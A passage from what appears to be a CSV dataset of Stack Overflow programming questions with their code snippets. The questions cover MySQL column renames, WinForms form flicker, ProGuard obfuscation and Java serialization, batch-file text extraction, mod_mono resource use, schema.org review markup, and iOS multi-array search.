it's been renamed/reconfigured. Compare the schema, if there's a new column- check it's position with regard to adjacent columns. If the name of the new column is in the same position as one which is missing compare the structure of that column. If it matches, consider it renamed. If not, consider it deleted then added.","['Field   Type    Null    Key Default Extra\nfield1  int(11) NO      NULL     \nfield2  int(11) NO      NULL     \nfield3  int(11) NO      NULL     \n', 'Field   Type    Null    Key Default Extra\nfield1  int(11) NO      NULL     \nfield4  int(11) NO      NULL     \nfield3  int(11) NO      NULL     \n', 'field2', 'field4', 'DROP, ADD AFTER', 'CHANGE COLUMN', '(1)    ALTER TABLE `demo` DROP `field2`\n       ALTER TABLE `demo` ADD `field4` INT( 11 ) NOT NULL AFTER `field1` \n\n(2)    ALTER TABLE `demo` CHANGE `field2` `field4` INT( 11 ) NOT NULL \n', 'ALTER TABLE table CHANGE COLUMN field new_name structure;', 'DROP column FROM table', 'ALTER TABLE table\n ADD column definition;']",False

However, I've found that when I create a form with the property set to (either via the VS designer, or programatically in the constructor), the window becomes visible prior to the event firing. For example: This in turn causes the displayed form to flicker a lot while its controls (which are laid out during the event) are resized while the window is visible. If I did not set the state to be maximized, then all the resizing is done before the window is shown (which is what I would have expected).

5782581,Obfuscate source code using ProGuard,"Recently I've had some problems with people cheating using an app for root users called Gamecih. Gamecih let's users pause games and change variables in runtime. If I obfuscate my code I though it'll be hard for cheaters to know what variables to change in runtime, but I'm also worried it might cause some other problems. I serialize game objects using Javas Serializable interface and then write them out to a file. Now let's say I'm serializing an object of the class ""Player"". It gets serialized and saved to a file. Then a user downloads the update with the Proguard implementation. Proguard will rename classes and class member names. Won't that cause major errors when trying to read in an already saved Player object? If I had not yet launched my game, this wouldn't be a problem. But now some players are playing on the same saved game(it's an RPG) for months. They would be pretty pissed off if they downloaded an update and had to start over from scratch. I know I can instruct Proguard not to obfuscate certain classes, but it's the Player class I really need to obfuscate. Clarification: Let's say I have the following simple unobfuscated class: A player is created, serialized and saved to a file. After I implement obfuscator, it might look like this: Imagine that I post an update now and a player that has an unobfuscated version of Player downloads that update.

5850862,how to get some text informations from a nontext file using batch commands in Windows?,"guys. I'm trying to get the file version from inside some nontext files. In each of them (approximately at the beginning) there are a few text lines containing informations about the file. For example: If you want I'll try to make such a file but I can't show you the original files (my company won't allow it). Sorry... I tried this code: But it works only if ""file.dat"" is a text file, if not I get ""not found"". If I replace file.dat with 'type file.dat' it does not return (processor usage 100%). If I replace file.dat with 'find /i ""version:"" file.dat' it works, but it's very, very slow (minutes). Since I have to process many files and I have little time I can't use it. It works a lot faster if I enter each file manually with a viewer and copy version number; but the point is that I want to do it with a cmd... Oh, and I can't install other programs on the computer where I'm working.... The OS is Windows XP x86. Please help me. Thank you.

Later later edit: the test file is useful to test IF the code finds the number but, been very small, it doesn't give you an idea about how much time is needed for a real data file. But you can do this: measure the time in which the test file is scanned and multiply by ""100 MB / 2088 Bytes"" = 50 219. For example this works with ""find"". With ""type"" is even slower (I think it's exponentially, not liniar).","['[some nontext data (very few)]\nversion: 455467\nbuild date: 23.11.2010\n.....\n[rest of the nontext data]\n', '@echo off\nfor /f ""tokens=1,2"" %%A in (file.dat) do if %%A==version: (set version=%%B\ngoto found)\necho not found\ngoto end\n:found\necho found: %version%\n:end\npause\n']",False

5958665,mod mono consuming lots of memory and cpu in some situations. How to improve this?,"I have set up a apache + mod_mono asp.net mvc3 website, and I'm facing some strange problems with it. Some times, for a reason I do not know, the website just stops responding. When this happens, I ssh into my Linode account (where I host my website) and run ""top"", only to verify that the mono process is using up to 400% CPU (how is that even possible? Virtualization, maybe?) and lots of memory. This is, supposedly, a known issue (see this). My website, however, is very new, and I never have more than 10-20 online visitors, so high load is out of the question. I have also done some stress tests locally and the issue does not appear. The issue only appears on my production server (that runs 24/7), which made me think it could be that mono needs to be restarted once in a while (although I would like to know why this is needed in my case, since my website is still very low-profile). For this reason, I set up a auto restart time of two hours for mono. Even after this the problem still showed up (although less frequently). Then, I immediately thought of configuring MonoMaxActiveRequests and MonoMaxWaitingRequests, but the truth is I have no idea whether these values should be low or high in order to avoid the problem I'm facing. I also don't understand why the MonoMaxWaitingRequests default value is only 20. Does that mean that 40 simultaneous requests is all my server can handle, since the wait line can't go beyond 20? Overall, my question(s) is(are): Am I doing something wrong or is there still an issue with mod mono? How can I know what values are sane for MonoMaxActiveRequests and MonoMaxWaitingRequests? Should I be increasing these values or reducing them to avoid the reported issue? Thanks in advance.",[],False

My website has been online for four years and has thousands of individual reviews. The website is a directory of places where a certain activity happens. Those places can be churches, city parks, fair grounds, retail stores, restaurants, national forests, gas stations, you name it! My website provides a write up of the location and the facilities that it provides in relation to the activities. The activity may or may not pertain to the location's assumed function (ie. my users aren't eating at the restaurant). Users who perform the activity come to my site and leave reviews about the place. Users may rate also the location but ratings are not part of the user reviews themselves. If I use hreview-aggregates, the rich text and stars show up in the google testing tool. If I only use the follow from schema.org, the tool doesn't show the snippet in the but recognizes the formatting: Everything looks great if I change it to I don't think that localbusiness is appropriate. Some of locations are just an empty spot in the middle of a field. Also, schema.org/localBusiness makes me feel like I should own it. schema.org/Place seems most appropriate but doesn't display the rich text snippet in the tool. Same thing with schema.org/Review. If I use it as the main wrapper, the snippet doesn't display. Other main wrappers that do work are Product and Restaurant. I would appreciate any advice that you can give. Is Place failing because of my markup? What would be a good type for the wrapper? The wrapper is required right? Should I just pick a main wrapper even if it doesn't exactly fit everything? Can I use both hreview-aggragate(microformat) and schema.org at the same time? That's what I am doing right now, and it shows up fine in the testing tool, but I have heard that you shouldn't. Is that still the current advice? It should also be noted that when I use data-vocabulary.org/Review with its proper syntax, everything displays fine in the tool as well...I am just having trouble with schema.org","['&lt;div itemprop=""aggregateRating"" itemscope itemtype=""http://schema.org/AggregateRating""&gt;\n  &lt;span itemprop=""name""&gt;The Hubcap Place&lt;/span&gt;\n  &lt;span itemprop=""itemreviewed""&gt;Hubcap City&lt;/span&gt;\n  &lt;span itemprop=""ratingValue""&gt;4&lt;/span&gt; stars -\n  &lt;span itemprop=""reviewCount""&gt;3077&lt;/span&gt; reviews\n&lt;/div&gt;\n', '&lt;title&gt;My Site&lt;/title&gt;\n&lt;div class=""entry"" itemtype=""http://schema.org/localBusiness"" itemscope=""""&gt;\n  &lt;span itemprop=""name""&gt;The Hubcap Place&lt;/span&gt;\n  &lt;span itemprop=""itemreviewed""&gt;Hubcap City&lt;/span&gt;\n  &lt;span itemprop=""author""&gt;Ellie&lt;/span&gt;\n  &lt;span itemtype=""http://schema.org/AggregateRating"" itemscope="""" itemprop=""aggregateRating""&gt;\n    &lt;meta content=""3.2"" itemprop=""ratingvalue""&gt;\n    &lt;meta content=""18"" itemprop=""ratingcount""&gt;\n  &lt;/span&gt;\n&lt;/div&gt;\n']",False
6006838,SearchDisplayController search multiple arrays,"Currently I'm populating my tableviewcells with the contents of multiple arrays representing a name, id, etc. My question comes when I start to use the search display controller. I have an array with a list of names, a list of IDs, a list of barcodes, and a list of Aliases. When the user types in the search bar I need to be able to search all 4 arrays. When it finds the result in 1 array it has to pair the result with the 3 other arrays.. Example Names (apple,carrot,banana, dog) alias (red, orange, yellow, brown) barcode (1,2,10,20) id (30, 40, 50, 60) So if the user types ""a"" I should populate the table view with Apple, Carrot, Banana and the associated alias, barcode, id. If the user were to type 2 I should only get carrot and dog. If the user were to type 0 I would get all of those items. Any ideas how to accomplish this? UPDATE: This is how I did it. Then when I'm populating the tableview I do something like this However when I type something like 9999 it brings up instances where only 1 9 is in the ID or barcode. Any ideas how to fix that? UPDATE2: Solved the problem by having the list always refresh instead of only reloading the data if a result was found. Now it works perfectly :D","['    -(BOOL)searchDisplayController:(UISearchDisplayController *)controller shouldReloadTableForSearchString:(NSString *)searchString {\n\n    BOOL shouldReturn = FALSE;\n    [searchResults removeAllObjects];\n\n    for (int i = 0; i &lt; [itemIDRows count]; i++) {\n\n        BOOL foundResult = FALSE;\n\n        if ([[itemIDRows objectAtIndex:i] rangeOfString:searchString].location != NSNotFound) {\n            foundResult = TRUE;\n        }\n        if ([[nameRows objectAtIndex:i] rangeOfString:searchString].location != NSNotFound) {\n            foundResult = TRUE;\n        }\n        if ([[barcodeRows objectAtIndex:i] rangeOfString:searchString].location != NSNotFound) {\n            foundResult = TRUE;\n        }\n        if ([[aliasRows objectAtIndex:i] rangeOfString:searchString].location != NSNotFound) {\n            foundResult = TRUE;\n        }\n        if (foundResult) {\n            NSNumber *result = [NSNumber numberWithInt:i];\n            if ([self searchResults] == nil) {\n                NSMutableArray *array = [[NSMutableArray alloc] init];\n                [self setSearchResults:array];\n                [array release];\n            }\n            [searchResults addObject:result];\n            shouldReturn = YES;\n        }\n    }\n    return shouldReturn;    \n}\n', 'if ([tableView isEqual:self.searchDisplayController.searchResultsTableView]) { \n    [cell setCellContentsName:[NSString stringWithFormat:@""%@"", [nameRows objectAtIndex:[[searchResults objectAtIndex:indexPath.row] integerValue]]];  \n} else {\n    [cell setCellContentsName:[NSString stringWithFormat:@""%@"", [nameRows objectAtIndex:indexPath.row]];\n}\n']",False

So I'd like to make two queries that I can define in separate places: one where A uses B as a subquery, but only returns rows from A.
